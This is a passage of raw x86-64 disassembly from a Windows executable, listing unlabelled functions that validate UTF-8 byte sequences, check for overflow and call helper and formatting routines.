   14000174e:	48 8b 94 2f 90 01 00 	mov    0x190(%rdi,%rbp,1),%rdx
   140001755:	00 
   140001756:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000175c:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140001762:	e8 0e 57 00 00       	call   0x140006e75
   140001767:	4a 8b 0c 3f          	mov    (%rdi,%r15,1),%rcx
   14000176b:	4a 8b 54 3f 08       	mov    0x8(%rdi,%r15,1),%rdx
   140001770:	e8 ac 00 00 00       	call   0x140001821
   140001775:	b0 01                	mov    $0x1,%al
   140001777:	45 31 c0             	xor    %r8d,%r8d
   14000177a:	4d 89 ef             	mov    %r13,%r15
   14000177d:	4c 89 e7             	mov    %r12,%rdi
   140001780:	e9 19 ff ff ff       	jmp    0x14000169e
   140001785:	a8 01                	test   $0x1,%al
   140001787:	74 3b                	je     0x1400017c4
   140001789:	48 85 ff             	test   %rdi,%rdi
   14000178c:	75 15                	jne    0x1400017a3
   14000178e:	4c 89 c7             	mov    %r8,%rdi
   140001791:	49 83 ef 01          	sub    $0x1,%r15
   140001795:	72 09                	jb     0x1400017a0
   140001797:	48 8b bf d8 03 00 00 	mov    0x3d8(%rdi),%rdi
   14000179e:	eb f1                	jmp    0x140001791
   1400017a0:	45 31 c0             	xor    %r8d,%r8d
   1400017a3:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
   1400017a8:	48 89 d9             	mov    %rbx,%rcx
   1400017ab:	48 89 fa             	mov    %rdi,%rdx
   1400017ae:	e8 43 01 00 00       	call   0x1400018f6
   1400017b3:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400017b8:	48 85 ff             	test   %rdi,%rdi
   1400017bb:	74 07                	je     0x1400017c4
   1400017bd:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   1400017c2:	eb e4                	jmp    0x1400017a8
   1400017c4:	48 8b 4e 38          	mov    0x38(%rsi),%rcx
   1400017c8:	48 8b 56 40          	mov    0x40(%rsi),%rdx
   1400017cc:	e8 50 00 00 00       	call   0x140001821
   1400017d1:	8b 4e 58             	mov    0x58(%rsi),%ecx
   1400017d4:	48 8b 56 60          	mov    0x60(%rsi),%rdx
   1400017d8:	e8 51 00 00 00       	call   0x14000182e
   1400017dd:	8b 4e 68             	mov    0x68(%rsi),%ecx
   1400017e0:	48 8b 56 70          	mov    0x70(%rsi),%rdx
   1400017e4:	e8 45 00 00 00       	call   0x14000182e
   1400017e9:	8b 4e 78             	mov    0x78(%rsi),%ecx
   1400017ec:	48 8b 96 80 00 00 00 	mov    0x80(%rsi),%rdx
   1400017f3:	48 83 c4 38          	add    $0x38,%rsp
   1400017f7:	5b                   	pop    %rbx
   1400017f8:	5d                   	pop    %rbp
   1400017f9:	5f                   	pop    %rdi
   1400017fa:	5e                   	pop    %rsi
   1400017fb:	41 5c                	pop    %r12
   1400017fd:	41 5d                	pop    %r13
   1400017ff:	41 5e                	pop    %r14
   140001801:	41 5f                	pop    %r15
   140001803:	e9 26 00 00 00       	jmp    0x14000182e
   140001808:	48 8d 0d d9 59 04 00 	lea    0x459d9(%rip),%rcx        # 0x1400471e8
   14000180f:	e8 0c 31 00 00       	call   0x140004920
   140001814:	48 8d 0d e5 59 04 00 	lea    0x459e5(%rip),%rcx        # 0x140047200
   14000181b:	e8 00 31 00 00       	call   0x140004920
   140001820:	cc                   	int3
   140001821:	48 89 c8             	mov    %rcx,%rax
   140001824:	48 f7 d8             	neg    %rax
   140001827:	0f 81 24 5f 00 00    	jno    0x140007751
   14000182d:	c3                   	ret
   14000182e:	83 f9 06             	cmp    $0x6,%ecx
   140001831:	77 0b                	ja     0x14000183e
   140001833:	b8 4f 00 00 00       	mov    $0x4f,%eax
   140001838:	0f a3 c8             	bt     %ecx,%eax
   14000183b:	73 01                	jae    0x14000183e
   14000183d:	c3                   	ret
   14000183e:	48 89 d1             	mov    %rdx,%rcx
   140001841:	e9 be fe 03 00       	jmp    0x140041704
   140001846:	31 c0                	xor    %eax,%eax
   140001848:	c3                   	ret
   140001849:	c3                   	ret
   14000184a:	48 b8 9c 9a 4e f6 31 	movabs $0x22ef4931f64e9a9c,%rax
   140001851:	49 ef 22 
   140001854:	48 ba dd a5 5c eb 63 	movabs $0x53c19d63eb5ca5dd,%rdx
   14000185b:	9d c1 53 
   14000185e:	c3                   	ret
   14000185f:	48 b8 78 45 9d 70 c1 	movabs $0x2d0be7c1709d4578,%rax
   140001866:	e7 0b 2d 
   140001869:	48 ba ee 39 72 8b 48 	movabs $0x8d90a3488b7239ee,%rdx
   140001870:	a3 90 8d 
   140001873:	c3                   	ret
   140001874:	48 83 ec 38          	sub    $0x38,%rsp
   140001878:	31 c0                	xor    %eax,%eax
   14000187a:	48 3b 01             	cmp    (%rcx),%rax
   14000187d:	71 1f                	jno    0x14000189e
   14000187f:	48 8b 0a             	mov    (%rdx),%rcx
   140001882:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140001886:	48 8b 40 18          	mov    0x18(%rax),%rax
   14000188a:	48 8d 15 9f 58 04 00 	lea    0x4589f(%rip),%rdx        # 0x140047130
   140001891:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140001897:	48 83 c4 38          	add    $0x38,%rsp
   14000189b:	48 ff e0             	rex.W jmp *%rax
   14000189e:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400018a3:	49 89 09             	mov    %rcx,(%r9)
   1400018a6:	48 8d 05 d8 fc ff ff 	lea    -0x328(%rip),%rax        # 0x140001585
   1400018ad:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400018b2:	48 8d 05 81 58 04 00 	lea    0x45881(%rip),%rax        # 0x14004713a
   1400018b9:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1400018bf:	48 89 d1             	mov    %rdx,%rcx
   1400018c2:	48 89 c2             	mov    %rax,%rdx
   1400018c5:	e8 46 4a 00 00       	call   0x140006310
   1400018ca:	90                   	nop
   1400018cb:	48 83 c4 38          	add    $0x38,%rsp
   1400018cf:	c3                   	ret
   1400018d0:	31 c0                	xor    %eax,%eax
   1400018d2:	48 3b 01             	cmp    (%rcx),%rax
   1400018d5:	b8 1e 00 00 00       	mov    $0x1e,%eax
   1400018da:	ba 2a 00 00 00       	mov    $0x2a,%edx
   1400018df:	48 0f 40 d0          	cmovo  %rax,%rdx
   1400018e3:	48 8d 0d 8c 76 86 00 	lea    0x86768c(%rip),%rcx        # 0x140868f76
   1400018ea:	48 8d 05 53 58 04 00 	lea    0x45853(%rip),%rax        # 0x140047144
   1400018f1:	48 0f 40 c1          	cmovo  %rcx,%rax
   1400018f5:	c3                   	ret
   1400018f6:	41 56                	push   %r14
   1400018f8:	56                   	push   %rsi
   1400018f9:	57                   	push   %rdi
   1400018fa:	53                   	push   %rbx
   1400018fb:	48 83 ec 28          	sub    $0x28,%rsp
   1400018ff:	48 89 d0             	mov    %rdx,%rax
   140001902:	48 89 ce             	mov    %rcx,%rsi
   140001905:	48 8b 9a 60 01 00 00 	mov    0x160(%rdx),%rbx
   14000190c:	48 85 db             	test   %rbx,%rbx
   14000190f:	74 10                	je     0x140001921
   140001911:	4c 89 c7             	mov    %r8,%rdi
   140001914:	48 ff c7             	inc    %rdi
   140001917:	44 0f b7 b0 d0 03 00 	movzwl 0x3d0(%rax),%r14d
   14000191e:	00 
   14000191f:	eb 03                	jmp    0x140001924
   140001921:	48 89 c7             	mov    %rax,%rdi
   140001924:	ba 08 00 00 00       	mov    $0x8,%edx
   140001929:	48 89 c1             	mov    %rax,%rcx
   14000192c:	e8 1f 0f 00 00       	call   0x140002850
   140001931:	48 89 1e             	mov    %rbx,(%rsi)
   140001934:	48 89 7e 08          	mov    %rdi,0x8(%rsi)
   140001938:	4c 89 76 10          	mov    %r14,0x10(%rsi)
   14000193c:	48 83 c4 28          	add    $0x28,%rsp
   140001940:	5b                   	pop    %rbx
   140001941:	5f                   	pop    %rdi
   140001942:	5e                   	pop    %rsi
   140001943:	41 5e                	pop    %r14
   140001945:	c3                   	ret
   140001946:	56                   	push   %rsi
   140001947:	48 83 ec 20          	sub    $0x20,%rsp
   14000194b:	48 89 ce             	mov    %rcx,%rsi
   14000194e:	e8 4d f4 03 00       	call   0x140040da0
   140001953:	48 85 c0             	test   %rax,%rax
   140001956:	74 06                	je     0x14000195e
   140001958:	48 83 c4 20          	add    $0x20,%rsp
   14000195c:	5e                   	pop    %rsi
   14000195d:	c3                   	ret
   14000195e:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001963:	48 89 f2             	mov    %rsi,%rdx
   140001966:	e8 c0 11 00 00       	call   0x140002b2b
   14000196b:	cc                   	int3
   14000196c:	48 8b 01             	mov    (%rcx),%rax
   14000196f:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001973:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140001977:	48 89 c1             	mov    %rax,%rcx
   14000197a:	49 ff e0             	rex.WB jmp *%r8
   14000197d:	41 57                	push   %r15
   14000197f:	41 56                	push   %r14
   140001981:	41 55                	push   %r13
   140001983:	41 54                	push   %r12
   140001985:	56                   	push   %rsi
   140001986:	57                   	push   %rdi
   140001987:	55                   	push   %rbp
   140001988:	53                   	push   %rbx
   140001989:	48 81 ec 78 02 00 00 	sub    $0x278,%rsp
   140001990:	0f 29 b4 24 60 02 00 	movaps %xmm6,0x260(%rsp)
   140001997:	00 
   140001998:	48 bd 00 00 00 00 00 	movabs $0x8000000000000000,%rbp
   14000199f:	00 00 80 
   1400019a2:	48 8d 15 87 59 04 00 	lea    0x45987(%rip),%rdx        # 0x140047330
   1400019a9:	48 8d b4 24 80 01 00 	lea    0x180(%rsp),%rsi
   1400019b0:	00 
   1400019b1:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   1400019b7:	48 89 f1             	mov    %rsi,%rcx
   1400019ba:	e8 61 e6 02 00       	call   0x140030020
   1400019bf:	48 8b 1e             	mov    (%rsi),%rbx
   1400019c2:	48 89 d8             	mov    %rbx,%rax
   1400019c5:	48 f7 d8             	neg    %rax
   1400019c8:	71 28                	jno    0x1400019f2
   1400019ca:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400019cf:	e8 72 ff ff ff       	call   0x140001946
   1400019d4:	49 89 c6             	mov    %rax,%r14
   1400019d7:	48 89 28             	mov    %rbp,(%rax)
   1400019da:	48 89 70 08          	mov    %rsi,0x8(%rax)
   1400019de:	48 89 78 10          	mov    %rdi,0x10(%rax)
   1400019e2:	4c 89 78 18          	mov    %r15,0x18(%rax)
   1400019e6:	48 8d 15 c3 58 04 00 	lea    0x458c3(%rip),%rdx        # 0x1400472b0
   1400019ed:	e9 89 01 00 00       	jmp    0x140001b7b
   1400019f2:	48 8b b4 24 88 01 00 	mov    0x188(%rsp),%rsi
   1400019f9:	00 
   1400019fa:	48 8b bc 24 90 01 00 	mov    0x190(%rsp),%rdi
   140001a01:	00 
   140001a02:	0f b6 84 24 98 01 00 	movzbl 0x198(%rsp),%eax
   140001a09:	00 
   140001a0a:	a8 01                	test   $0x1,%al
   140001a0c:	0f 85 ac 00 00 00    	jne    0x140001abe
   140001a12:	48 85 ff             	test   %rdi,%rdi
   140001a15:	0f 84 a3 00 00 00    	je     0x140001abe
   140001a1b:	0f b6 8c 24 9f 01 00 	movzbl 0x19f(%rsp),%ecx
   140001a22:	00 
   140001a23:	c1 e1 10             	shl    $0x10,%ecx
   140001a26:	0f b7 94 24 9d 01 00 	movzwl 0x19d(%rsp),%edx
   140001a2d:	00 
   140001a2e:	09 ca                	or     %ecx,%edx
   140001a30:	48 c1 e2 20          	shl    $0x20,%rdx
   140001a34:	44 8b bc 24 99 01 00 	mov    0x199(%rsp),%r15d
   140001a3b:	00 
   140001a3c:	49 09 d7             	or     %rdx,%r15
   140001a3f:	48 8d 0c 3e          	lea    (%rsi,%rdi,1),%rcx
   140001a43:	49 89 f0             	mov    %rsi,%r8
   140001a46:	49 8d 50 01          	lea    0x1(%r8),%rdx
   140001a4a:	45 8a 08             	mov    (%r8),%r9b
   140001a4d:	45 84 c9             	test   %r9b,%r9b
   140001a50:	79 64                	jns    0x140001ab6
   140001a52:	41 80 f9 e0          	cmp    $0xe0,%r9b
   140001a56:	73 0d                	jae    0x140001a65
   140001a58:	49 83 c0 02          	add    $0x2,%r8
   140001a5c:	48 39 ca             	cmp    %rcx,%rdx
   140001a5f:	49 0f 45 d0          	cmovne %r8,%rdx
   140001a63:	eb 51                	jmp    0x140001ab6
   140001a65:	41 80 f9 ed          	cmp    $0xed,%r9b
   140001a69:	75 22                	jne    0x140001a8d
   140001a6b:	48 39 ca             	cmp    %rcx,%rdx
   140001a6e:	74 4e                	je     0x140001abe
   140001a70:	49 8d 50 02          	lea    0x2(%r8),%rdx
   140001a74:	48 39 ca             	cmp    %rcx,%rdx
   140001a77:	74 45                	je     0x140001abe
   140001a79:	41 80 78 01 9f       	cmpb   $0x9f,0x1(%r8)
   140001a7e:	0f 87 9b 03 00 00    	ja     0x140001e1f
   140001a84:	49 83 c0 03          	add    $0x3,%r8
   140001a88:	4c 89 c2             	mov    %r8,%rdx
   140001a8b:	eb 29                	jmp    0x140001ab6
   140001a8d:	49 83 c0 02          	add    $0x2,%r8
   140001a91:	48 39 ca             	cmp    %rcx,%rdx
   140001a94:	4c 0f 44 c2          	cmove  %rdx,%r8
   140001a98:	31 d2                	xor    %edx,%edx
   140001a9a:	49 39 c8             	cmp    %rcx,%r8
   140001a9d:	0f 95 c2             	setne  %dl
   140001aa0:	4c 01 c2             	add    %r8,%rdx
   140001aa3:	41 80 f9 f0          	cmp    $0xf0,%r9b
   140001aa7:	72 0d                	jb     0x140001ab6
   140001aa9:	45 31 c0             	xor    %r8d,%r8d
   140001aac:	48 39 ca             	cmp    %rcx,%rdx
   140001aaf:	41 0f 95 c0          	setne  %r8b
   140001ab3:	4c 01 c2             	add    %r8,%rdx
   140001ab6:	49 89 d0             	mov    %rdx,%r8
   140001ab9:	48 39 ca             	cmp    %rcx,%rdx
   140001abc:	75 88                	jne    0x140001a46
   140001abe:	48 c7 44 24 20 12 00 	movq   $0x12,0x20(%rsp)
   140001ac5:	00 00 
   140001ac7:	4c 8d 0d 69 58 04 00 	lea    0x45869(%rip),%r9        # 0x140047337
   140001ace:	4c 8d b4 24 e0 00 00 	lea    0xe0(%rsp),%r14
   140001ad5:	00 
   140001ad6:	4c 89 f1             	mov    %r14,%rcx
   140001ad9:	48 89 f2             	mov    %rsi,%rdx
   140001adc:	49 89 f8             	mov    %rdi,%r8
   140001adf:	e8 cc f1 03 00       	call   0x140040cb0
   140001ae4:	48 89 d9             	mov    %rbx,%rcx
   140001ae7:	48 89 f2             	mov    %rsi,%rdx
   140001aea:	e8 62 5c 00 00       	call   0x140007751
   140001aef:	49 8b 76 08          	mov    0x8(%r14),%rsi
   140001af3:	49 8b 7e 10          	mov    0x10(%r14),%rdi
   140001af7:	48 c7 44 24 20 09 00 	movq   $0x9,0x20(%rsp)
   140001afe:	00 00 
   140001b00:	4c 8d 0d 42 58 04 00 	lea    0x45842(%rip),%r9        # 0x140047349
   140001b07:	48 8d 8c 24 a8 00 00 	lea    0xa8(%rsp),%rcx
   140001b0e:	00 
   140001b0f:	48 89 f2             	mov    %rsi,%rdx
   140001b12:	49 89 f8             	mov    %rdi,%r8
   140001b15:	e8 96 f1 03 00       	call   0x140040cb0
   140001b1a:	48 89 f1             	mov    %rsi,%rcx
   140001b1d:	48 89 fa             	mov    %rdi,%rdx
   140001b20:	e8 0b 2c 03 00       	call   0x140034730
   140001b25:	48 85 c0             	test   %rax,%rax
   140001b28:	75 1a                	jne    0x140001b44
   140001b2a:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140001b31:	00 
   140001b32:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
   140001b39:	00 
   140001b3a:	e8 f1 2b 03 00       	call   0x140034730
   140001b3f:	48 85 c0             	test   %rax,%rax
   140001b42:	74 56                	je     0x140001b9a
   140001b44:	48 89 c1             	mov    %rax,%rcx
   140001b47:	e8 04 f9 ff ff       	call   0x140001450
   140001b4c:	49 89 c6             	mov    %rax,%r14
   140001b4f:	48 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%rcx
   140001b56:	00 
   140001b57:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
   140001b5e:	00 
   140001b5f:	e8 ed 5b 00 00       	call   0x140007751
   140001b64:	48 8b 8c 24 e0 00 00 	mov    0xe0(%rsp),%rcx
   140001b6b:	00 
   140001b6c:	48 89 f2             	mov    %rsi,%rdx
   140001b6f:	e8 dd 5b 00 00       	call   0x140007751
   140001b74:	48 8d 15 bd 56 04 00 	lea    0x456bd(%rip),%rdx        # 0x140047238
   140001b7b:	4c 89 f0             	mov    %r14,%rax
   140001b7e:	0f 28 b4 24 60 02 00 	movaps 0x260(%rsp),%xmm6
   140001b85:	00 
   140001b86:	48 81 c4 78 02 00 00 	add    $0x278,%rsp
   140001b8d:	5b                   	pop    %rbx
   140001b8e:	5d                   	pop    %rbp
   140001b8f:	5f                   	pop    %rdi
   140001b90:	5e                   	pop    %rsi
   140001b91:	41 5c                	pop    %r12
   140001b93:	41 5d                	pop    %r13
   140001b95:	41 5e                	pop    %r14
   140001b97:	41 5f                	pop    %r15
   140001b99:	c3                   	ret
   140001b9a:	48 8d 05 cf 57 04 00 	lea    0x457cf(%rip),%rax        # 0x140047370
   140001ba1:	48 8d 9c 24 80 01 00 	lea    0x180(%rsp),%rbx
   140001ba8:	00 
   140001ba9:	48 89 03             	mov    %rax,(%rbx)
   140001bac:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140001bb2:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   140001bb6:	b8 08 00 00 00       	mov    $0x8,%eax
   140001bbb:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001bbf:	41 be 08 00 00 00    	mov    $0x8,%r14d
   140001bc5:	0f 57 f6             	xorps  %xmm6,%xmm6
   140001bc8:	0f 11 73 18          	movups %xmm6,0x18(%rbx)
   140001bcc:	48 89 d9             	mov    %rbx,%rcx
   140001bcf:	e8 9c 43 03 00       	call   0x140035f70
   140001bd4:	48 8d 05 bd 57 04 00 	lea    0x457bd(%rip),%rax        # 0x140047398
   140001bdb:	48 89 03             	mov    %rax,(%rbx)
   140001bde:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   140001be2:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   140001be6:	0f 11 73 18          	movups %xmm6,0x18(%rbx)
   140001bea:	48 8d 9c 24 80 01 00 	lea    0x180(%rsp),%rbx
   140001bf1:	00 
   140001bf2:	48 89 d9             	mov    %rbx,%rcx
   140001bf5:	e8 76 43 03 00       	call   0x140035f70
   140001bfa:	4c 8d 74 24 30       	lea    0x30(%rsp),%r14
   140001bff:	49 c7 06 00 86 12 00 	movq   $0x128600,(%r14)
   140001c06:	4c 8d 6c 24 68       	lea    0x68(%rsp),%r13
   140001c0b:	4d 89 75 00          	mov    %r14,0x0(%r13)
   140001c0f:	48 8d 05 b2 57 04 00 	lea    0x457b2(%rip),%rax        # 0x1400473c8
   140001c16:	48 89 03             	mov    %rax,(%rbx)
   140001c19:	b8 02 00 00 00       	mov    $0x2,%eax
   140001c1e:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001c22:	48 83 63 20 00       	andq   $0x0,0x20(%rbx)
   140001c27:	4c 8d 25 02 16 00 00 	lea    0x1602(%rip),%r12        # 0x140003230
   140001c2e:	4d 89 65 08          	mov    %r12,0x8(%r13)
   140001c32:	4c 89 6b 10          	mov    %r13,0x10(%rbx)
   140001c36:	4c 89 7b 18          	mov    %r15,0x18(%rbx)
   140001c3a:	48 8d 9c 24 80 01 00 	lea    0x180(%rsp),%rbx
   140001c41:	00 
   140001c42:	48 89 d9             	mov    %rbx,%rcx
   140001c45:	e8 26 43 03 00       	call   0x140035f70
   140001c4a:	49 c7 06 00 64 00 00 	movq   $0x6400,(%r14)
   140001c51:	48 8d 05 a0 57 04 00 	lea    0x457a0(%rip),%rax        # 0x1400473f8
   140001c58:	48 89 03             	mov    %rax,(%rbx)
   140001c5b:	b8 02 00 00 00       	mov    $0x2,%eax
   140001c60:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001c64:	48 83 63 20 00       	andq   $0x0,0x20(%rbx)
   140001c69:	4d 89 75 00          	mov    %r14,0x0(%r13)
   140001c6d:	4d 89 65 08          	mov    %r12,0x8(%r13)
   140001c71:	4c 89 6b 10          	mov    %r13,0x10(%rbx)
   140001c75:	4c 89 7b 18          	mov    %r15,0x18(%rbx)
   140001c79:	48 8d 9c 24 80 01 00 	lea    0x180(%rsp),%rbx
   140001c80:	00 
   140001c81:	48 89 d9             	mov    %rbx,%rcx
   140001c84:	e8 e7 42 03 00       	call   0x140035f70
   140001c89:	48 8d 05 a8 57 04 00 	lea    0x457a8(%rip),%rax        # 0x140047438
   140001c90:	48 89 03             	mov    %rax,(%rbx)
   140001c93:	49 c7 06 00 fe 6e 00 	movq   $0x6efe00,(%r14)
   140001c9a:	b8 02 00 00 00       	mov    $0x2,%eax
   140001c9f:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001ca3:	48 83 63 20 00       	andq   $0x0,0x20(%rbx)
   140001ca8:	4d 89 75 00          	mov    %r14,0x0(%r13)
   140001cac:	4d 89 65 08          	mov    %r12,0x8(%r13)
   140001cb0:	4c 89 6b 10          	mov    %r13,0x10(%rbx)
   140001cb4:	4c 89 7b 18          	mov    %r15,0x18(%rbx)
   140001cb8:	48 8d 9c 24 80 01 00 	lea    0x180(%rsp),%rbx
   140001cbf:	00 
   140001cc0:	48 89 d9             	mov    %rbx,%rcx
   140001cc3:	e8 a8 42 03 00       	call   0x140035f70
   140001cc8:	48 8d 05 89 57 04 00 	lea    0x45789(%rip),%rax        # 0x140047458
   140001ccf:	48 89 03             	mov    %rax,(%rbx)
   140001cd2:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   140001cd6:	b8 08 00 00 00       	mov    $0x8,%eax
   140001cdb:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001cdf:	0f 11 73 18          	movups %xmm6,0x18(%rbx)
   140001ce3:	48 8d 8c 24 80 01 00 	lea    0x180(%rsp),%rcx
   140001cea:	00 
   140001ceb:	e8 80 42 03 00       	call   0x140035f70
   140001cf0:	48 c7 44 24 20 10 00 	movq   $0x10,0x20(%rsp)
   140001cf7:	00 00 
   140001cf9:	4c 8d 0d 68 57 04 00 	lea    0x45768(%rip),%r9        # 0x140047468
   140001d00:	48 8d 9c 24 00 01 00 	lea    0x100(%rsp),%rbx
   140001d07:	00 
   140001d08:	48 89 d9             	mov    %rbx,%rcx
   140001d0b:	48 89 f2             	mov    %rsi,%rdx
   140001d0e:	49 89 f8             	mov    %rdi,%r8
   140001d11:	e8 9a ef 03 00       	call   0x140040cb0
   140001d16:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
   140001d1a:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140001d1e:	48 89 f9             	mov    %rdi,%rcx
   140001d21:	48 89 da             	mov    %rbx,%rdx
   140001d24:	e8 49 f7 ff ff       	call   0x140001472
   140001d29:	48 89 d6             	mov    %rdx,%rsi
   140001d2c:	a8 01                	test   $0x1,%al
   140001d2e:	74 10                	je     0x140001d40
   140001d30:	48 89 f1             	mov    %rsi,%rcx
   140001d33:	e8 18 f7 ff ff       	call   0x140001450
   140001d38:	49 89 c6             	mov    %rax,%r14
   140001d3b:	e9 5d 05 00 00       	jmp    0x14000229d
   140001d40:	48 8d 8c 24 38 02 00 	lea    0x238(%rsp),%rcx
   140001d47:	00 
   140001d48:	48 89 31             	mov    %rsi,(%rcx)
   140001d4b:	48 8d 15 26 57 04 00 	lea    0x45726(%rip),%rdx        # 0x140047478
   140001d52:	41 b8 00 86 12 00    	mov    $0x128600,%r8d
   140001d58:	e8 58 f7 ff ff       	call   0x1400014b5
   140001d5d:	48 85 c0             	test   %rax,%rax
   140001d60:	74 10                	je     0x140001d72
   140001d62:	48 89 c1             	mov    %rax,%rcx
   140001d65:	e8 e6 f6 ff ff       	call   0x140001450
   140001d6a:	49 89 c6             	mov    %rax,%r14
   140001d6d:	e9 23 05 00 00       	jmp    0x140002295
   140001d72:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140001d77:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140001d7c:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140001d81:	48 8d 05 18 dd 16 00 	lea    0x16dd18(%rip),%rax        # 0x14016faa0
   140001d88:	48 8d 8c 24 80 01 00 	lea    0x180(%rsp),%rcx
   140001d8f:	00 
   140001d90:	48 89 01             	mov    %rax,(%rcx)
   140001d93:	48 c7 41 08 02 00 00 	movq   $0x2,0x8(%rcx)
   140001d9a:	00 
   140001d9b:	48 83 61 20 00       	andq   $0x0,0x20(%rcx)
   140001da0:	48 8d 05 d9 ef 03 00 	lea    0x3efd9(%rip),%rax        # 0x140040d80
   140001da7:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001dac:	4c 89 71 10          	mov    %r14,0x10(%rcx)
   140001db0:	48 c7 41 18 01 00 00 	movq   $0x1,0x18(%rcx)
   140001db7:	00 
   140001db8:	e8 b3 41 03 00       	call   0x140035f70
   140001dbd:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
   140001dc4:	00 
   140001dc5:	4c 8b bc 24 b8 00 00 	mov    0xb8(%rsp),%r15
   140001dcc:	00 
   140001dcd:	48 c7 44 24 20 0a 00 	movq   $0xa,0x20(%rsp)
   140001dd4:	00 00 
   140001dd6:	4c 8d 0d e3 dc 16 00 	lea    0x16dce3(%rip),%r9        # 0x14016fac0
   140001ddd:	48 8d bc 24 20 01 00 	lea    0x120(%rsp),%rdi
   140001de4:	00 
   140001de5:	48 89 f9             	mov    %rdi,%rcx
   140001de8:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
   140001ded:	4d 89 f8             	mov    %r15,%r8
   140001df0:	e8 bb ee 03 00       	call   0x140040cb0
   140001df5:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140001df9:	4c 8b 67 10          	mov    0x10(%rdi),%r12
   140001dfd:	48 89 d9             	mov    %rbx,%rcx
   140001e00:	4c 89 e2             	mov    %r12,%rdx
   140001e03:	e8 6a f6 ff ff       	call   0x140001472
   140001e08:	48 89 d7             	mov    %rdx,%rdi
   140001e0b:	a8 01                	test   $0x1,%al
   140001e0d:	74 1f                	je     0x140001e2e
   140001e0f:	48 89 f9             	mov    %rdi,%rcx
   140001e12:	e8 39 f6 ff ff       	call   0x140001450
   140001e17:	49 89 c6             	mov    %rax,%r14
   140001e1a:	e9 61 04 00 00       	jmp    0x140002280
   140001e1f:	49 c1 e7 08          	shl    $0x8,%r15
   140001e23:	49 09 c7             	or     %rax,%r15
   140001e26:	48 89 dd             	mov    %rbx,%rbp
   140001e29:	e9 9c fb ff ff       	jmp    0x1400019ca
   140001e2e:	48 8d 8c 24 40 02 00 	lea    0x240(%rsp),%rcx
   140001e35:	00 
   140001e36:	48 89 39             	mov    %rdi,(%rcx)
   140001e39:	48 8d 15 8a dc 16 00 	lea    0x16dc8a(%rip),%rdx        # 0x14016faca
   140001e40:	41 b8 00 64 00 00    	mov    $0x6400,%r8d
   140001e46:	e8 6a f6 ff ff       	call   0x1400014b5
   140001e4b:	48 85 c0             	test   %rax,%rax
   140001e4e:	74 10                	je     0x140001e60
   140001e50:	48 89 c1             	mov    %rax,%rcx
   140001e53:	e8 f8 f5 ff ff       	call   0x140001450
   140001e58:	49 89 c6             	mov    %rax,%r14
   140001e5b:	e9 18 04 00 00       	jmp    0x140002278
   140001e60:	48 89 5c 24 68       	mov    %rbx,0x68(%rsp)
   140001e65:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   140001e6a:	48 8d 05 77 40 17 00 	lea    0x174077(%rip),%rax        # 0x140175ee8
   140001e71:	48 8d 8c 24 80 01 00 	lea    0x180(%rsp),%rcx
   140001e78:	00 
   140001e79:	48 89 01             	mov    %rax,(%rcx)
   140001e7c:	48 c7 41 08 02 00 00 	movq   $0x2,0x8(%rcx)
   140001e83:	00 
   140001e84:	48 83 61 20 00       	andq   $0x0,0x20(%rcx)
   140001e89:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140001e8e:	48 8d 05 eb ee 03 00 	lea    0x3eeeb(%rip),%rax        # 0x140040d80
   140001e95:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001e9a:	4c 89 71 10          	mov    %r14,0x10(%rcx)
   140001e9e:	48 c7 41 18 01 00 00 	movq   $0x1,0x18(%rcx)
   140001ea5:	00 
   140001ea6:	e8 c5 40 03 00       	call   0x140035f70
   140001eab:	48 c7 44 24 20 14 00 	movq   $0x14,0x20(%rsp)
   140001eb2:	00 00 
   140001eb4:	4c 8d 0d 4d 40 17 00 	lea    0x17404d(%rip),%r9        # 0x140175f08
   140001ebb:	48 8d 9c 24 40 01 00 	lea    0x140(%rsp),%rbx
   140001ec2:	00 
   140001ec3:	48 89 d9             	mov    %rbx,%rcx
   140001ec6:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140001ecb:	4d 89 f8             	mov    %r15,%r8
   140001ece:	e8 dd ed 03 00       	call   0x140040cb0
   140001ed3:	4c 8b 63 08          	mov    0x8(%rbx),%r12
   140001ed7:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140001edb:	4c 89 e1             	mov    %r12,%rcx
   140001ede:	48 89 da             	mov    %rbx,%rdx
   140001ee1:	e8 8c f5 ff ff       	call   0x140001472
